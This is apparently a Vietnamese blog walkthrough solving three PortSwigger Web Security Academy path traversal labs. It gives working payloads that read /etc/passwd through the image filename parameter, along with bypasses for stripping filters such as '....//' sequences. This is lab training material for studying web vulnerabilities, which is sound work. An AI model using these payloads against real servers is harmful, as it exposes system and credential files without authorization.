---
title: "[PortSwigger Lab] - Path Traversal"
description: Solution of Path Traversal on PortSwigger Lab
date: 2025-06-01 11:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, path traversal, directory traversal]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-01-portswigger-lab-path-traversal/path-traversal.png
    alt: Path Traversal
---

## Introduction
--- 

**Path traversal** còn được gọi là **Directory traversal**. Các lỗ hổng này cho phép kẻ tấn công đọc các tệp tùy ý trên máy chủ đang chạy một ứng dụng. Điều này có thể bao gồm:
- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.

Trong một số trường hợp, kẻ tấn công có thể ghi vào các tệp tùy ý trên máy chủ, cho phép chúng sửa đổi dữ liệu hoặc hành vi ứng dụng và cuối cùng kiểm soát toàn bộ máy chủ.

## Solve Path Traversal Lab
---
- **Relative path:** `../../../etc/passwd`
- **Absolute path:** `/etc/passwd`
- **View images**: Filter settings > Filter bt MINE type > enable `images`
### Lab: File path traversal, simple case
- Mở 1 image bất kỳ
```
https://0af90002046a785a82be974700ff007e.web-security-academy.net/image?filename=8.jpg
```

- Thay đổi đường dẫn của image
```
https://0af90002046a785a82be974700ff007e.web-security-academy.net/image?filename=../../../etc/passwd
```

- Điều này khiến ứng dụng đọc từ đường dẫn tệp sau
```
/var/www/images/../../../etc/passwd
```

- Trình tự `../` có giá trị trong một **file path** và có nghĩa là để tăng một cấp trong cấu trúc thư mục. Ba chuỗi liên tiếp `..`:
    - Lần 1:
    ```
    /var/www/../../etc/passwd
    ```
    - Lần 2:
    ```
    /var/../etc/passwd
    ```
    - Lần 3:
    ```
    /etc/passwd
    ```

- Cuối cùng ứng dụng hiển thị nội dung của file `/etc/passwd`
- `/etc/passwd` là một tập tin hệ thống rất quan trọng trong các hệ điều hành **Unix**và **Linux**. Nó lưu trữ thông tin về user trên hệ thống. Dù tên là `"passwd" (password)`, nhưng mật khẩu thực tế không còn được lưu ở đây nữa mà được lưu trong tệp `/etc/shadow` với quyền truy cập hạn chế hơn.
- Truy cập **HTTP history** để xem nội dung

### File path traversal, traversal sequences blocked with absolute path bypass
- `../` đã bị block, cần bypass thông qua **absolute path**
- Mở 1 file ảnh bất kỳ trong tab mới
```
https://0a35004b0379e87d805eb796009c003b.web-security-academy.net/image?filename=33.jpg
```
- Thay đổi tên ảnh bằng **absolute path**: `/etc/passwd`
```
https://0a35004b0379e87d805eb796009c003b.web-security-academy.net/image?filename=/etc/passwd
```
- Truy cập **HTTP history** để xem nội dung

### File path traversal, traversal sequences stripped non-recursively
#### Analysis
Ở lab này, chương trình sẽ loại bỏ các **traversal sequences**, tức:
```
../../../etc/passwd
```
Sẽ trở thành
```
etc/passwd
```
Chương trình sẽ xóa tất cả `../` ra khỏi chuỗi

#### Exploit
Ý tưởng: vẫn để chương trình loại bỏ `../`, nhưng vẫn giữ được đường dẫn tương đối đến `/etc/passwd`
- Payload 1: ..././..././..././etc/passwd
- Payload 2: ....//....//....//etc/passwd
- Payload 3: ....\/....\/....\/etc/passwd

Sau khi chương trình đã loại bỏ `../` hoặc `..\` thì mọi thứ đểù trở thành `../../../etc/passwd`
> **Windows** sử dụng cả `../` và `..\`
{: .prompt-info}

- Thay đổi đường dẫn hình ảnh sử dụng các payload trên.
- Truy cập **HTTP history** để xem nội dung


---
Goodluck! 🍀🍀🍀
